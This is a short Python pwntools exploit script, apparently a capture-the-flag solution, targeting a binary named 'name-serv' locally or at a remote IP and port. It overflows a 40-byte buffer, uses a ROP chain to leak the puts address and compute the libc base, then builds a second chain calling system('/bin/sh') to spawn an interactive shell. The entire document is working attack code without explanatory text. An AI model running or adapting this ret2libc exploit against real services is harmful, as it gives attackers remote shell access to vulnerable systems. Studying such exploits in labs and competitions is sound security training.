from pwn import *

if args.REMOTE:
    p = remote("3.97.113.25", 9001)
    libc = ELF("./libc.so.6")
else:
    if args.GDB:
        p = gdb.debug("./name-serv")
    else:
        p = process("./name-serv")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF("./name-serv")
rop = ROP(elf)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 40
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.symbols.puts)
payload += p64(elf.symbols.main)

p.sendlineafter(b"name:", payload)

leak_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
info(f"leak puts address: {hex(leak_puts)}")
libc.address = leak_puts - libc.symbols.puts
info(f"libc base address: {hex(libc.address)}")

bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols["system"]

payload = b"A"*40
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
payload += p64(libc.symbols.exit)

p.sendlineafter(b"name:", payload)

p.interactive()